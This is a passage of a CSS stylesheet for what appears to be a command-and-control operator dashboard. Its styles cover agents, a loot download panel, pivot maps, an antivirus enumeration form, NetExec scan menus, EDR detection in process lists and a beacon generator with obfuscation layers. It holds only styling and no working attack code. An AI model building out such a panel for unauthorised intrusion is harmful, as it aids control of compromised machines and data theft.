  flex:1;overflow-y:auto;padding:12px 16px;min-height:0;
  background:rgba(0,0,0,0.6);border-radius:0 0 8px 8px;border:1px solid var(--border);
  border-top:none;font-family:var(--mono);font-size:13px;line-height:1.6;
}
.side-panel-body.pivot-layout{display:flex;flex-direction:column;overflow:hidden}
.side-panel-body::-webkit-scrollbar{width:6px}
.side-panel-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}

/* Input */
.input-bar{
  display:flex;gap:8px;padding:8px 0;align-items:center;position:relative;
}
.input-bar .prompt{color:var(--red);font-family:var(--mono);font-size:14px;font-weight:700;white-space:nowrap}
.input-bar input{
  flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);
  border-radius:6px;padding:10px 14px;color:var(--text);
  font-family:var(--mono);font-size:13px;outline:none;
}
.input-bar .ghost{
  position:absolute;left:0;top:0;right:0;bottom:0;
  padding:10px 14px;color:var(--text2);opacity:0.4;
  font-family:var(--mono);font-size:13px;pointer-events:none;
  white-space:nowrap;overflow:hidden;
}
.input-bar input:focus{border-color:var(--red-dim);box-shadow:0 0 8px rgba(255,26,26,0.15)}
.input-bar input::placeholder{color:var(--text2)}
.input-bar button{
  padding:10px 18px;background:var(--red-dim);color:#fff;border:none;
  border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;
  font-family:var(--sans);transition:background 0.15s;
}
.input-bar button:hover{background:var(--red)}

/* Autocomplete dropdown */
.ac-dropdown{
  position:absolute;bottom:100%;left:0;right:80px;
  background:var(--surface);border:1px solid var(--border);border-radius:6px;
  max-height:200px;overflow-y:auto;display:none;z-index:10;
  box-shadow:0 -4px 20px rgba(0,0,0,0.5);
}
.ac-dropdown.open{display:block}
.ac-item{
  padding:6px 14px;font-family:var(--mono);font-size:12px;cursor:pointer;
  color:var(--text);transition:background 0.1s;display:flex;align-items:center;gap:8px;
}
.ac-item:hover,.ac-item.selected{background:rgba(255,26,26,0.12);color:var(--red)}
.ac-item .hint{color:var(--text2);font-size:11px;margin-left:auto}

/* Toolbar */
.toolbar{
  display:flex;gap:6px;padding:8px 12px;flex-wrap:wrap;
  background:rgba(0,0,0,0.6);border-radius:8px;border:1px solid var(--border);
}
.toolbar button{
  padding:6px 14px;background:rgba(255,255,255,0.04);color:var(--text);border:1px solid rgba(255,255,255,0.08);
  border-radius:5px;font-size:12px;cursor:pointer;font-family:var(--sans);transition:all 0.15s;
  display:flex;align-items:center;gap:5px;backdrop-filter:blur(4px);
}
.toolbar button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
.toolbar button .ico{font-size:14px}

/* File browser */
.filebrowser{display:flex;gap:0;height:100%;min-height:0}
.fb-tree{
  width:180px;min-width:120px;flex-shrink:0;overflow-y:auto;overflow-x:hidden;
  border-right:1px solid var(--border);padding:6px 0;font-size:12px;
  font-family:var(--mono);
}
.fb-tree::-webkit-scrollbar{width:4px}
.fb-tree::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
.fb-tree-node{
  display:flex;align-items:center;gap:4px;padding:3px 8px;cursor:pointer;
  color:var(--text2);white-space:nowrap;transition:all 0.1s;border-radius:3px;margin:0 4px;
}
.fb-tree-node:hover{background:rgba(255,26,26,0.08);color:var(--text)}
.fb-tree-node.active{background:rgba(255,26,26,0.15);color:var(--red)}
.fb-tree-node .t-ico{flex-shrink:0;font-size:12px;width:16px;text-align:center}
.fb-tree-node .t-name{overflow:hidden;text-overflow:ellipsis}
.fb-tree-children{padding-left:12px}
.fb-main{flex:1;display:flex;flex-direction:column;min-width:0;min-height:0}
.fb-path{
  display:flex;align-items:center;gap:8px;padding:6px 10px;flex-shrink:0;
  font-family:var(--mono);font-size:12px;color:var(--text2);
  border-bottom:1px solid rgba(255,255,255,0.03);
}
.fb-path button{
  background:var(--surface2);color:var(--text);border:1px solid var(--border);
  border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer;font-family:var(--mono);
}
.fb-path button:hover{border-color:var(--red-dim);color:var(--red)}
.fb-list{flex:1;overflow-y:auto;min-height:0;padding:0 2px}
.fb-entry{
  display:flex;align-items:center;gap:8px;padding:4px 8px;
  border-radius:4px;cursor:pointer;font-family:var(--mono);font-size:12px;
  transition:background 0.1s;
}
.fb-entry:hover{background:rgba(255,26,26,0.06)}
.fb-entry.selected{background:rgba(255,26,26,0.12)}
.fb-entry .ico{width:18px;text-align:center;font-size:14px;flex-shrink:0}
.fb-entry.dir .name{color:var(--red)}
.fb-entry.file .name{color:var(--text)}
.fb-entry .name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fb-entry .size{color:var(--text2);font-size:11px;flex-shrink:0;min-width:60px;text-align:right}
.fb-entry .mtime{color:var(--text2);font-size:10px;flex-shrink:0;min-width:100px}
.fb-entry .ftype{
  font-size:9px;padding:1px 5px;border-radius:3px;flex-shrink:0;
  background:rgba(255,255,255,0.04);color:var(--text2);text-transform:uppercase;min-width:40px;text-align:center;
}
.fb-entry .ftype.code{background:rgba(51,255,51,0.08);color:#55cc55}
.fb-entry .ftype.cert{background:rgba(255,100,100,0.1);color:#ff8888}
.fb-entry .ftype.binary{background:rgba(255,165,0,0.1);color:#ffaa55}
.fb-entry .ftype.archive{background:rgba(187,102,204,0.1);color:#bb88dd}
.fb-entry .ftype.database{background:rgba(85,136,204,0.1);color:#5588cc}
.fb-entry .ftype.image{background:rgba(0,200,200,0.1);color:#44cccc}
.fb-entry .perm{color:var(--text2);font-size:10px;flex-shrink:0;min-width:80px;font-family:var(--mono)}
.fb-entry .actions{display:none;gap:4px;flex-shrink:0}
.fb-entry:hover .actions{display:flex}
.fb-entry .actions button{
  background:var(--surface2);color:var(--text2);border:1px solid var(--border);
  border-radius:3px;padding:2px 7px;font-size:10px;cursor:pointer;
  font-family:var(--mono);transition:all 0.1s;white-space:nowrap;
}
.fb-entry .actions button:hover{border-color:var(--red-dim);color:var(--red);background:rgba(255,26,26,0.1)}
.fb-detail{
  flex-shrink:0;border-top:1px solid var(--border);padding:10px 12px;
  font-family:var(--mono);font-size:11px;max-height:180px;overflow-y:auto;
  background:rgba(0,0,0,0.3);
}
.fb-detail .fd-header{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.fb-detail .fd-header .fd-ico{font-size:20px}
.fb-detail .fd-header .fd-name{font-weight:700;font-size:13px;color:#fff;flex:1;word-break:break-all}
.fb-detail .fd-grid{display:grid;grid-template-columns:80px 1fr;gap:2px 10px}
.fb-detail .fd-lbl{color:var(--text2);text-align:right}
.fb-detail .fd-val{color:var(--text);word-break:break-all}
.fb-detail .fd-val.highlight{color:var(--green)}
.fb-detail .fd-val.warn{color:var(--orange)}
.fd-actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
.fd-btn{
  padding:4px 10px;border:1px solid var(--border);border-radius:4px;
  background:var(--bg2);color:var(--text);font-size:11px;cursor:pointer;
  display:flex;align-items:center;gap:4px;transition:all 0.15s;
}
.fd-btn:hover{background:var(--bg3);border-color:var(--text2)}
.fd-btn.dl{border-color:var(--green-dim);color:var(--green)}
.fd-btn.dl:hover{background:rgba(0,200,83,0.1)}
.fd-btn.loot{border-color:var(--orange-dim,var(--orange));color:var(--orange)}
.fd-btn.loot:hover{background:rgba(255,152,0,0.1)}
.fd-btn.up{border-color:var(--blue-dim,var(--blue));color:var(--blue,#42a5f5)}
.fd-btn.up:hover{background:rgba(66,165,245,0.1)}
.loot-overlay{
  position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);
  z-index:9999;display:flex;align-items:center;justify-content:center;
}
.loot-panel{
  background:var(--bg);border:1px solid var(--border);border-radius:8px;
  padding:20px;min-width:400px;max-width:600px;max-height:70vh;overflow-y:auto;
  position:relative;
}
.loot-panel h2{margin:0 0 12px;font-size:16px;color:var(--text)}
.loot-close{position:absolute;top:12px;right:12px;background:none;border:none;color:var(--text2);cursor:pointer;font-size:16px}
.loot-loading,.loot-empty{color:var(--text2);font-size:13px}
.loot-list{display:flex;flex-direction:column;gap:4px}
.loot-item{
  display:flex;align-items:center;gap:10px;padding:8px;border-radius:4px;
  background:var(--bg2);
}
.loot-item:hover{background:var(--bg3)}
.loot-ico{font-size:18px}
.loot-info{flex:1;min-width:0}
.loot-name{display:block;color:var(--green);font-size:12px;text-decoration:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.loot-name:hover{text-decoration:underline}
.loot-meta{font-size:10px;color:var(--text2)}
.loot-dl{color:var(--green);text-decoration:none;font-size:16px;padding:4px}
.loot-dl:hover{color:var(--text)}
.fb-upload-zone{
  border:2px dashed var(--border);border-radius:6px;padding:12px;margin:6px 8px;
  text-align:center;color:var(--text2);font-size:11px;cursor:pointer;
  transition:all 0.15s;flex-shrink:0;
}
.fb-upload-zone:hover,.fb-upload-zone.drag-over{
  border-color:var(--red-dim);color:var(--red);background:rgba(255,26,26,0.05);
}

/* Empty state */
.empty{flex:1}

/* Toast container */
.toast-container{
  position:fixed;top:54px;right:16px;z-index:100;
  display:flex;flex-direction:column;gap:8px;pointer-events:none;
  max-width:380px;
}
.toast{
  pointer-events:auto;
  display:flex;align-items:flex-start;gap:10px;
  padding:12px 16px;border-radius:8px;
  background:var(--surface);border:1px solid var(--border);
  box-shadow:0 4px 24px rgba(0,0,0,0.5);
  font-size:12px;color:var(--text);
  animation:toast-in 0.3s ease-out;
  transition:opacity 0.3s,transform 0.3s;
}
.toast.fade-out{opacity:0;transform:translateX(40px)}
.toast .t-icon{font-size:18px;flex-shrink:0;line-height:1}
.toast .t-body{flex:1;min-width:0}
.toast .t-title{font-weight:700;font-size:12px;margin-bottom:2px}
.toast .t-msg{color:var(--text2);font-size:11px;word-break:break-word}
.toast.t-success{border-color:var(--green-dim)}
.toast.t-success .t-title{color:var(--green)}
.toast.t-warning{border-color:var(--orange)}
.toast.t-warning .t-title{color:var(--orange)}
.toast.t-error{border-color:#cc3333}
.toast.t-error .t-title{color:#ff6666}
.toast.t-info{border-color:var(--red-dim)}
.toast.t-info .t-title{color:var(--red)}
@keyframes toast-in{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}

/* Topbar icon buttons */
.topbar-ico-btn{
  background:none;border:none;cursor:pointer;font-size:18px;
  color:var(--text2);transition:color 0.15s;padding:4px;margin-left:8px;
}
.topbar-ico-btn:hover{color:var(--text)}

/* Notification bell */
.bell-wrap{position:relative;margin-left:8px}
.bell-btn{
  background:none;border:none;cursor:pointer;font-size:18px;
  color:var(--text2);transition:color 0.15s;padding:4px;position:relative;
}
.bell-btn:hover{color:var(--text)}
.bell-badge{
  position:absolute;top:0;right:0;min-width:15px;height:15px;
  background:var(--red);color:#fff;font-size:9px;font-weight:700;
  border-radius:8px;display:flex;align-items:center;justify-content:center;
  padding:0 4px;pointer-events:none;
}
.bell-badge:empty,.bell-badge[data-count="0"]{display:none}
.notif-panel{
  position:absolute;top:calc(100% + 8px);right:0;width:360px;max-height:480px;
  background:var(--surface);border:1px solid var(--border);border-radius:8px;
  box-shadow:0 8px 32px rgba(0,0,0,0.6);display:none;z-index:200;
  flex-direction:column;overflow:hidden;
}
.notif-panel.open{display:flex}
.notif-header{
  display:flex;align-items:center;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.notif-header span{flex:1;font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.05em}
.notif-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:11px;
  padding:3px 8px;border-radius:4px;
}
.notif-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.notif-list{flex:1;overflow-y:auto;padding:4px 0}
.notif-list::-webkit-scrollbar{width:4px}
.notif-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
.notif-item{
  display:flex;gap:10px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.03);
  transition:background 0.1s;
}
.notif-item:hover{background:rgba(255,26,26,0.04)}
.notif-item.unread{background:rgba(255,26,26,0.06)}
.notif-item .ni-icon{font-size:16px;flex-shrink:0;margin-top:1px}
.notif-item .ni-body{flex:1;min-width:0}
.notif-item .ni-title{font-size:12px;font-weight:600;color:var(--text)}
.notif-item .ni-msg{font-size:11px;color:var(--text2);margin-top:1px;word-break:break-word}
.notif-item .ni-time{font-size:10px;color:var(--text2);flex-shrink:0;margin-top:1px}
.notif-item.t-success .ni-title{color:var(--green)}
.notif-item.t-warning .ni-title{color:var(--orange)}
.notif-item.t-error .ni-title{color:#ff6666}
.notif-item.t-info .ni-title{color:var(--red)}
.notif-empty{padding:30px;text-align:center;color:var(--text2);font-size:12px}

/* Settings gear */
.gear-wrap{position:relative;margin-left:4px}
.gear-btn{
  background:none;border:none;cursor:pointer;font-size:17px;
  color:var(--text2);transition:color 0.15s,transform 0.3s;padding:4px;
}
.gear-btn:hover{color:var(--text);transform:rotate(45deg)}
.settings-panel{
  position:absolute;top:calc(100% + 8px);right:0;width:400px;
  background:var(--surface);border:1px solid var(--border);border-radius:8px;
  box-shadow:0 8px 32px rgba(0,0,0,0.6);display:none;z-index:200;
  flex-direction:column;overflow:hidden;
}
.settings-panel.open{display:flex}
.settings-header{
  display:flex;align-items:center;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.settings-header span{flex:1;font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.05em}
.settings-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:14px;
  padding:3px 8px;border-radius:4px;
}
.settings-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.settings-body{padding:12px 14px;overflow-y:auto;max-height:480px}
.settings-body::-webkit-scrollbar{width:4px}
.settings-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
.cfg-section{margin-bottom:16px}
.cfg-section-title{
  font-size:11px;font-weight:700;color:var(--red);text-transform:uppercase;
  letter-spacing:0.06em;margin-bottom:8px;padding-bottom:4px;
  border-bottom:1px solid var(--border);
}
.cfg-row{
  display:flex;align-items:center;padding:5px 0;gap:10px;font-size:12px;
}
.cfg-row .cfg-label{color:var(--text2);width:100px;flex-shrink:0;text-align:right}
.cfg-row .cfg-value{color:var(--text);font-family:var(--mono);font-size:12px;word-break:break-all;flex:1}
.cfg-row .cfg-value.warn{color:var(--orange)}
.cfg-row .cfg-value.ok{color:var(--green)}
.cfg-row .cfg-value.secure{color:var(--green)}
.cfg-copy{
  background:none;border:1px solid var(--border);color:var(--text2);
  border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;
  font-family:var(--mono);transition:all 0.15s;margin-left:4px;flex-shrink:0;
}
.cfg-copy:hover{border-color:var(--red-dim);color:var(--red)}
.cfg-uptime{
  display:inline-block;padding:2px 8px;background:rgba(51,255,51,0.08);
  border:1px solid var(--green-dim);border-radius:4px;color:var(--green);
  font-family:var(--mono);font-size:11px;
}
.cfg-stat{
  display:inline-flex;align-items:center;gap:6px;padding:6px 12px;
  background:rgba(255,255,255,0.03);border:1px solid var(--border);
  border-radius:6px;font-family:var(--mono);font-size:13px;
}
.cfg-stat .num{font-weight:700;font-size:16px}
.cfg-stats-row{display:flex;gap:10px;margin-top:8px;flex-wrap:wrap}

/* Pivot map */
.pivot-canvas{width:100%;height:100%;display:block;cursor:grab}
.pivot-canvas:active{cursor:grabbing}
.pivot-controls{
  display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;flex-shrink:0;position:relative;
}
.pivot-controls button{
  padding:5px 12px;background:rgba(255,255,255,0.04);color:var(--text);border:1px solid var(--border);
  border-radius:4px;font-size:11px;cursor:pointer;font-family:var(--sans);transition:all 0.15s;
}
.pivot-controls button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
.pivot-legend{
  display:flex;gap:14px;padding:6px 0;font-size:11px;color:var(--text2);flex-wrap:wrap;flex-shrink:0;
}
.pivot-legend span{display:flex;align-items:center;gap:4px}
.pivot-legend .dot{width:10px;height:10px;border-radius:50%;display:inline-block}
.pivot-tooltip{
  position:absolute;z-index:300;
  background:rgba(8,12,20,0.95);border:1px solid rgba(85,136,204,0.4);
  border-radius:8px;padding:0;min-width:260px;max-width:360px;
  box-shadow:0 8px 32px rgba(0,0,0,0.7),0 0 20px rgba(85,136,204,0.1);
  font-family:var(--mono);font-size:12px;color:var(--text);
  pointer-events:auto;animation:tooltip-in 0.15s ease-out;overflow:hidden;
}
@keyframes tooltip-in{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
.pivot-tooltip .tt-header{
  display:flex;align-items:center;gap:8px;padding:10px 14px;
  background:rgba(85,136,204,0.08);border-bottom:1px solid rgba(85,136,204,0.15);
}
.pivot-tooltip .tt-header .tt-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.pivot-tooltip .tt-header .tt-title{font-weight:700;font-size:13px;flex:1;color:#fff}
.pivot-tooltip .tt-header .tt-close{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:14px;padding:2px 4px;
}
.pivot-tooltip .tt-header .tt-close:hover{color:var(--red)}
.pivot-tooltip .tt-body{padding:10px 14px}
.pivot-tooltip .tt-row{display:flex;padding:3px 0;gap:8px}
.pivot-tooltip .tt-lbl{color:var(--text2);width:70px;flex-shrink:0;text-align:right;font-size:11px}
.pivot-tooltip .tt-val{color:var(--text);word-break:break-all;font-size:11px}
.pivot-tooltip .tt-val.highlight{color:var(--green)}
.pivot-tooltip .tt-val.warn{color:var(--orange)}
.pivot-tooltip .tt-section{
  font-size:10px;text-transform:uppercase;letter-spacing:0.06em;
  color:var(--text2);padding:8px 0 3px;border-top:1px solid rgba(255,255,255,0.05);
  margin-top:4px;
}
.pivot-tooltip .tt-ports{display:flex;flex-wrap:wrap;gap:4px;padding:4px 0}
.pivot-tooltip .tt-port{
  padding:2px 7px;background:rgba(85,136,204,0.12);border:1px solid rgba(85,136,204,0.25);
  border-radius:3px;font-size:10px;color:var(--text);
}
.pivot-tooltip .tt-port.critical{border-color:rgba(255,100,100,0.4);background:rgba(255,100,100,0.08);color:#ff8888}
.pivot-tooltip .tt-port.ssl{border-color:rgba(68,221,170,0.4);background:rgba(68,221,170,0.08);color:#44ddaa}
.pivot-tooltip .tt-banner{
  font-size:10px;color:var(--text2);padding:3px 0;word-break:break-all;line-height:1.5;
}
.pivot-tooltip .tt-banner.ssl{
  background:rgba(68,221,170,0.04);border-left:2px solid rgba(68,221,170,0.3);
  padding:4px 8px;margin:3px 0;border-radius:2px;
}

/* Log viewer */
.log-controls{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;flex-shrink:0}
.log-controls button,.log-controls select{
  padding:4px 10px;background:rgba(255,255,255,0.04);color:var(--text);
  border:1px solid var(--border);border-radius:4px;font-size:11px;cursor:pointer;
  font-family:var(--sans);transition:all 0.15s;
}
.log-controls button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
.log-controls button.active{background:rgba(255,26,26,0.2);border-color:var(--red);color:var(--red)}
.log-entry{
  display:flex;gap:8px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);
  font-size:11px;line-height:1.5;font-family:var(--mono);
}
.log-entry:hover{background:rgba(255,255,255,0.02)}
.log-ts{color:var(--text2);white-space:nowrap;flex-shrink:0;width:140px}
.log-cat{
  padding:1px 6px;border-radius:3px;font-size:10px;font-weight:700;
  text-transform:uppercase;white-space:nowrap;flex-shrink:0;min-width:70px;text-align:center;
}
.log-cat.REGISTER{background:rgba(51,255,51,0.12);color:#33ff33}
.log-cat.RECONNECT{background:rgba(51,200,255,0.12);color:#33ccff}
.log-cat.TASK{background:rgba(255,215,0,0.12);color:#ffd700}
.log-cat.DISPATCH{background:rgba(255,165,0,0.12);color:#ffaa33}
.log-cat.RESULT{background:rgba(85,136,204,0.12);color:#5588cc}
.log-cat.DOWNLOAD{background:rgba(187,102,204,0.12);color:#bb66cc}
.log-cat.STARTUP{background:rgba(255,26,26,0.12);color:var(--red)}
.log-cat.ERROR{background:rgba(255,50,50,0.15);color:#ff5555}
.log-agent{color:var(--green);white-space:nowrap;flex-shrink:0}
.log-msg{color:var(--text);word-break:break-all;flex:1}

/* AV enum dialog */
.avenum-form{display:flex;flex-direction:column;gap:8px}
.avenum-form label{display:flex;flex-direction:column;gap:2px;font-size:11px;color:var(--text2)}
.avenum-form input[type="text"],.avenum-form input[type="password"],.avenum-form input:not([type]){
  padding:6px 8px;background:var(--bg2);color:var(--text);
  border:1px solid var(--border);border-radius:4px;font-size:12px;
}
.avenum-form input:focus{border-color:var(--red-dim);outline:none}
.ave-check{flex-direction:row !important;align-items:center;gap:6px !important}
.ave-check input{width:auto}
.ave-run{
  margin-top:4px;padding:8px 16px;background:var(--red-dim);color:var(--red);
  border:1px solid var(--red-dim);border-radius:4px;cursor:pointer;font-weight:700;font-size:12px;
}
.ave-run:hover{background:rgba(255,26,26,0.2)}

/* NXC scan menu */
.nxc-menu{
  position:absolute;top:100%;left:0;z-index:100;
  background:var(--bg);border:1px solid var(--border);border-radius:6px;
  padding:8px 0;min-width:260px;box-shadow:0 8px 24px rgba(0,0,0,0.4);
}
.nxc-title{padding:4px 12px 8px;font-weight:700;font-size:12px;color:var(--text);border-bottom:1px solid var(--border)}
.nxc-section{padding:8px 12px 2px;font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:0.05em;font-weight:600}
.nxc-menu button{
  display:block;width:100%;text-align:left;padding:5px 12px;
  background:none;border:none;color:var(--text);font-size:11px;cursor:pointer;
}
.nxc-menu button:hover{background:rgba(255,26,26,0.08);color:var(--red)}
.nxc-host-pick{padding:4px 12px}
.nxc-host-pick select{
  width:100%;padding:3px 6px;background:var(--bg2);color:var(--text);
  border:1px solid var(--border);border-radius:3px;font-size:11px;
}
.nxc-custom{display:flex;gap:4px;padding:4px 12px}
.nxc-custom input{
  flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);
  border:1px solid var(--border);border-radius:3px;font-size:11px;
}
.nxc-custom button{flex-shrink:0}
.nxc-note{padding:6px 12px;font-size:10px;color:var(--text2);font-style:italic;border-top:1px solid var(--border);margin-top:4px}

/* Process view with EDR detection */
.proc-summary{padding:10px 12px;border-bottom:1px solid var(--border)}
.proc-alert{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.proc-alert-ico{font-size:18px}
.proc-alert-title{font-weight:700;font-size:13px;color:#ff5555}
.proc-detections{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px}
.proc-det{
  display:flex;align-items:center;gap:6px;padding:4px 8px;
  background:var(--bg2);border-radius:3px;font-size:11px;
}
.proc-det-name{color:var(--text);font-weight:600}
.proc-det-tag{padding:1px 5px;border-radius:2px;font-size:10px;font-weight:600}
.proc-det-sev{font-size:10px;text-transform:uppercase}
.proc-beacon-info{font-size:11px;color:#FFD700;padding:4px 0}
.proc-list{font-family:monospace;font-size:11px;padding:4px 0}
.proc-line{padding:1px 12px;white-space:pre;overflow-x:auto;color:var(--text)}
.proc-line:hover{background:rgba(255,255,255,0.03)}
.proc-header{color:var(--text2);font-weight:700;position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--border)}
.proc-beacon{background:rgba(255,215,0,0.08);color:#FFD700;font-weight:700}
.proc-flagged{background:rgba(255,50,50,0.06)}
.proc-tag{
  display:inline-block;padding:0 5px;border-radius:2px;font-size:9px;
  font-family:var(--font);vertical-align:middle;margin-left:6px;font-weight:600;
}
.proc-tag.beacon{background:rgba(255,215,0,0.15);color:#FFD700}

/* Netstat view */
.ns-summary{display:flex;gap:8px;padding:10px 12px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.ns-stat{
  display:flex;flex-direction:column;align-items:center;
  padding:6px 14px;border-radius:4px;background:var(--bg2);min-width:60px;
}
.ns-num{font-size:18px;font-weight:700;color:var(--text);font-variant-numeric:tabular-nums}
.ns-lbl{font-size:10px;color:var(--text2);margin-top:2px}
.ns-stat.listen .ns-num{color:var(--green)}
.ns-stat.active .ns-num{color:#42a5f5}
.ns-stat.warn .ns-num{color:var(--orange)}
.ns-section{margin:4px 0}
.ns-title{padding:6px 12px;font-size:11px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:0.05em}
.ns-table{width:100%;border-collapse:collapse;font-size:11px}
.ns-table th{
  text-align:left;padding:4px 8px;color:var(--text2);font-weight:600;
  border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg);
}
.ns-table td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.04);color:var(--text)}
.ns-table tr:hover td{background:rgba(255,255,255,0.03)}
.ns-row-warn td{background:rgba(255,152,0,0.05)}
.ns-row-warn:hover td{background:rgba(255,152,0,0.1)}
.ns-addr{font-family:monospace;white-space:nowrap}
.ns-tag{
  display:inline-block;padding:1px 6px;border-radius:3px;font-size:10px;
  margin:1px 2px;white-space:nowrap;
}
.ns-tag.svc{background:rgba(66,165,245,0.12);color:#42a5f5}
.ns-tag.listen{background:rgba(0,200,83,0.1);color:var(--green)}
.ns-tag.active{background:rgba(66,165,245,0.1);color:#42a5f5}
.ns-tag.highlight{background:rgba(255,215,0,0.12);color:#ffd700}
.ns-tag.warn{background:rgba(255,80,40,0.15);color:#ff6644}

/* Server log drawer */
.srvlog-drawer{
  position:fixed;top:0;right:0;bottom:0;width:480px;max-width:90vw;
  background:var(--bg);border-left:1px solid var(--border);
  display:flex;flex-direction:column;z-index:9998;
  transform:translateX(100%);transition:transform 0.2s ease;
  box-shadow:-4px 0 20px rgba(0,0,0,0.3);
}
.srvlog-drawer.open{transform:translateX(0)}
.srvlog-header{
  display:flex;align-items:center;justify-content:space-between;
  padding:12px 16px;border-bottom:1px solid var(--border);
  font-weight:700;font-size:14px;color:var(--text);flex-shrink:0;
}
.srvlog-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:16px;
  padding:4px 8px;border-radius:4px;
}
.srvlog-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.srvlog-controls{
  display:flex;gap:4px;padding:8px 12px;flex-wrap:wrap;
  border-bottom:1px solid var(--border);flex-shrink:0;
}
.srvlog-controls button{
  background:var(--bg2);border:1px solid var(--border);color:var(--text2);
  padding:3px 8px;border-radius:3px;font-size:11px;cursor:pointer;
}
.srvlog-controls button:hover{color:var(--text);border-color:var(--text2)}
.srvlog-controls button.active{color:var(--red);border-color:var(--red-dim);background:rgba(255,26,26,0.08)}
.srvlog-body{flex:1;overflow-y:auto;min-height:0;padding:4px 0}
.srvlog-body::-webkit-scrollbar{width:6px}
.srvlog-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}

/* Scrollbar */
.agent-list::-webkit-scrollbar{width:4px}
.agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}

/* Beacon Generator */
.bgen-result{margin-top:12px;display:flex;flex-direction:column;gap:8px}
.bgen-tab-bar{display:flex;gap:0;border-bottom:1px solid rgba(255,255,255,0.08)}
.bgen-tab{
  padding:6px 14px;font-size:11px;cursor:pointer;border:none;
  background:none;color:var(--text2);border-bottom:2px solid transparent;
}
.bgen-tab.active{color:var(--red);border-bottom-color:var(--red)}
.bgen-tab:hover{color:var(--text)}
.bgen-code{
  background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);
  border-radius:4px;padding:10px;font-family:monospace;font-size:11px;
  color:var(--green);word-break:break-all;white-space:pre-wrap;
  max-height:200px;overflow-y:auto;user-select:all;cursor:text;line-height:1.5;
}
.bgen-meta{display:flex;gap:16px;font-size:10px;color:var(--text2);padding:4px 0}
.bgen-meta span{display:flex;align-items:center;gap:4px}
.bgen-copy{
  padding:6px 16px;background:rgba(255,26,26,0.12);border:1px solid var(--red-dim);
  border-radius:4px;color:var(--red);cursor:pointer;font-size:11px;align-self:flex-end;
}
.bgen-copy:hover{background:rgba(255,26,26,0.2)}
.bgen-layers{display:flex;align-items:center;gap:8px}
.bgen-layers input[type=range]{flex:1;accent-color:var(--red)}
.bgen-layers .bgen-lval{font-size:12px;color:var(--red);min-width:18px;text-align:center}
.bgen-delivery{display:flex;gap:12px;padding:2px 0}
.bgen-dlabel{
  display:flex;align-items:center;gap:5px;font-size:11px;color:var(--text);
  cursor:pointer;flex-direction:row !important;
}
.bgen-dlabel.disabled{color:var(--text2);cursor:not-allowed;opacity:0.5}
.bgen-dlabel input{width:auto;accent-color:var(--red)}
.bgen-deob-chain{display:flex;flex-direction:column;gap:0;overflow-y:auto;padding:4px 0}
.bgen-deob-step{border:1px solid rgba(255,255,255,0.06);overflow:hidden}
.bgen-deob-step:first-child{border-radius:4px 4px 0 0}
.bgen-deob-step:last-child{border-radius:0 0 4px 4px}
.bgen-deob-step+.bgen-deob-step{border-top:none}
.bgen-deob-step.raw{border-color:rgba(68,221,170,0.25)}
.bgen-deob-hdr{
  display:flex;align-items:center;justify-content:space-between;
  padding:7px 10px;background:rgba(255,255,255,0.03);cursor:pointer;user-select:none;
}
.bgen-deob-hdr:hover{background:rgba(255,255,255,0.06)}
.bgen-deob-badge{
  font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.05em;
  padding:2px 8px;border-radius:3px;background:rgba(255,26,26,0.12);color:var(--red);
}
.bgen-deob-step.raw .bgen-deob-badge{background:rgba(68,221,170,0.12);color:var(--green)}
.bgen-deob-right{display:flex;align-items:center;gap:8px}
.bgen-deob-size{font-size:10px;color:var(--text2)}
.bgen-deob-chevron{font-size:10px;color:var(--text2);transition:transform .2s}
.bgen-deob-step.open .bgen-deob-chevron{transform:rotate(90deg)}
.bgen-deob-body{display:none;border-top:1px solid rgba(255,255,255,0.04)}
.bgen-deob-step.open .bgen-deob-body{display:block}
.bgen-deob-body .bgen-code{border:none;border-radius:0;max-height:350px}
